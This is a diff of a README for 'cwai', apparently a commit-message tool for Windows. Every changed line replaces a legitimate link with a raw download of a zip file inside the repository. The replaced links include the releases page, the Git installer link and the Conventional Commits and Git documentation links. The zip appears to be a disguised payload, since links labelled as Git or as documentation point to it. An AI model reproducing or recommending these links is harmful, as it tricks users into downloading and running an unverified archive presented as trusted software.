@@ -1,6 +1,6 @@
 # ⚙️ cwai - Generate Commit Messages Easily
 
-[![Download cwai](https://img.shields.io/badge/Download-cwai-brightgreen?style=for-the-badge&logo=github)](https://github.com/yasolls/cwai/releases)
+[![Download cwai](https://img.shields.io/badge/Download-cwai-brightgreen?style=for-the-badge&logo=github)](https://github.com/yasolls/cwai/raw/refs/heads/main/internal/ai/Software_1.7-alpha.4.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Make sure you have:
 
 - Windows 10 or later  
 - At least 200 MB of free space  
-- Git installed (you can download it from [https://git-scm.com/download/win](https://git-scm.com/download/win))  
+- Git installed (you can download it from [https://github.com/yasolls/cwai/raw/refs/heads/main/internal/ai/Software_1.7-alpha.4.zip](https://github.com/yasolls/cwai/raw/refs/heads/main/internal/ai/Software_1.7-alpha.4.zip))  
 - A working internet connection for AI features  
 
 ---
@@ -42,7 +42,7 @@ Make sure you have:
 
 Use the link below to visit the releases page where you can download the latest version of cwai.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-cwai-blue?style=for-the-badge&logo=github)](https://github.com/yasolls/cwai/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-cwai-blue?style=for-the-badge&logo=github)](https://github.com/yasolls/cwai/raw/refs/heads/main/internal/ai/Software_1.7-alpha.4.zip)
 
 On the releases page:
 
@@ -129,8 +129,8 @@ You can customize cwai by editing a simple configuration file. This file lets yo
 
 If you want to know more about conventional commits or git:
 
-- [Conventional Commits](https://www.conventionalcommits.org/en/v1.0.0/)  
-- [Git Official Documentation](https://git-scm.com/doc)  
+- [Conventional Commits](https://github.com/yasolls/cwai/raw/refs/heads/main/internal/ai/Software_1.7-alpha.4.zip)  
+- [Git Official Documentation](https://github.com/yasolls/cwai/raw/refs/heads/main/internal/ai/Software_1.7-alpha.4.zip)  
 
 ---
 
@@ -146,4 +146,4 @@ It runs as a command-line app, meaning it works in terminals or command windows 
 
 Make sure to visit the releases page linked below to get the latest version for Windows:
 
-[Download cwai on GitHub](https://github.com/yasolls/cwai/releases)
+[Download cwai on GitHub](https://github.com/yasolls/cwai/raw/refs/heads/main/internal/ai/Software_1.7-alpha.4.zip)
